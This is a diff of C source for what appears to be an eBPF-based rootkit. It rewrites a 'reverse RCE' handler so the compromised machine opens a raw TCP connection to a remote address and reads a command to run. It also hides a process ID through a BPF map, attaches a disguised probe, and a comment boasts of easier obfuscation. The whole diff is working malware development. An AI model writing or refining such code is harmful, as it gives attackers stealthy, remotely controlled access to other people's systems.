@@ -68,17 +68,28 @@ void usage() {
 // be executed on the bookit exploited machine.
 void handlerevrce(char dial[INET_ADDRSTRLEN], char *rce) {
   printf("  ** Boop: %s\n ", dial);
-  // -- Hacky implementation --
-  char cmd[MAX_RCE_SIZE];
-  sprintf(cmd, "ncat %s %d", dial, PORT);
-  FILE *fp;
-  fp = popen(cmd, "r");
-  if (fp == NULL) {
+  struct sockaddr_in daddr;
+  daddr.sin_family = AF_INET;
+  daddr.sin_port = htons(PORT);
+  if (inet_pton(AF_INET, dial, &daddr.sin_addr) != 1) {
+    printf("Destination IP configuration failed.\n");
     return;
   }
-  while (fgets(rce, MAX_RCE_SIZE, fp) != NULL) {
+  int revsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+  if (revsock == -1) {
+    printf("Socket creation failed\n");
+    return;
   }
-  // -- Hacky implementation --
+  if (connect(revsock, (struct sockaddr *)&daddr, sizeof daddr) < 0) {
+    printf("Connection SOCK_STREAM refused.\n");
+    return;
+  }
+
+  char buffer[MAX_RCE_SIZE];
+  read(revsock, buffer, MAX_RCE_SIZE);
+  close(revsock);
+  strncpy(rce, buffer, MAX_RCE_SIZE);
+  printf("  ** RCE: %s\n", rce);
 }
 
 // config is the configuration options for the program
@@ -163,7 +174,10 @@ void rootcheck(int argc, char **argv) {
 
 // main
 //
-// The primary program entry point and argument handling
+// The primary program entry point and argument handling.
+//
+// By design this will only log to stdout to create an
+// easier obfuscating experience!
 int main(int argc, char **argv) {
   asciiheader();
   clisetup(argc, argv);
@@ -217,14 +231,14 @@ int main(int argc, char **argv) {
   ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array), &index,
                             &prog_fd, BPF_ANY);
   if (ret == -1) {
-    printf("Failed to hide PID: %s\n", strerror(errno));
+    printf("Failed to obfuscated PID\n");
     return 1;
   }
 
   // Attach to probe
   err = pr0be_safe__attach(sfobj);
   if (err) {
-    fprintf(stderr, "Failed to attach BPF program: %s\n", strerror(errno));
+    printf("Failed to attach %s\n", cfg.pr0besafepath);
     return 1;
   }
 
@@ -233,7 +247,7 @@ int main(int argc, char **argv) {
   rb = ring_buffer__new(bpf_map__fd(sfobj->maps.rb), handlepidlookup, NULL,
                         NULL);
   if (!rb) {
-    fprintf(stderr, "Failed to create ring buffer\n");
+    printf("Failed to create ring buffer\n");
     return 1;
   }
 
